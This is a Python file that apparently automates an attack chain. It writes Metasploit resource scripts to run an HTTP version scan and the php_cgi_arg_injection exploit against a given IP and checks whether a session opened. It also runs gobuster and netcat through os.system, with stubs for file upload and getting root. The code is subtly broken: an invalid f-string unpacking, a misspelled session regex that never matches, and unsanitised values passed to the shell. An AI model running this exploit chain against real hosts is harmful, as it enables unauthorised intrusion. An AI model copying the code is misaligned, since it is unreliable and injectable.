import os
from packaging import version
from subprocess import Popen, PIPE
import re
Default = False

class Function():
        
    def http_version(func_in, Data):
        # - msfconsole
        # - wait for 15s (msfconsole opening)
        # - use auxiliary/scanner/http/http_version
        # - set RHOSTS {IP}
        # - run
        # - (assume get Apache/2.4.6)
        match = Default # set default first

        configFile=open('meta.rc','w')
        configFile.write('use auxiliary/scanner/http/http_version\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                # print(Data['Apache'])
                # problem 1:This way, however, isn't import condition from block!!!
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True

            print(outputLine)     
            
        return Data, match
            

    def php_cgi_arg_injection(func_in, Data):
        # use exploit/multi/http/php_cgi_arg_injection
        # - set RHOSTS {IP}
        # - run
        match = Default # set default first

        configFile=open('meta.rc','w')
        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True
            print(outputLine)        
        
        return Data, match
    
    def print_something(func_in, Data):
        print("class chain is running~~")
        return Data, False

    def gobuster(func_in, Data):
        # need to handle wordlist (undone)
        os.system(f"gobuster dir -u {func_in['IP']} -w 'wordlist'")
        return Data, False

    def upload_file(func_in, Data):
        return Data, False

    def netcat(func_in, Data):
        # unpack argument list and use
        os.system(f"nc {*Data['argument']} {func_in['port']}")
        return Data, False

    def get_root(func_in, Data):
        return Data, False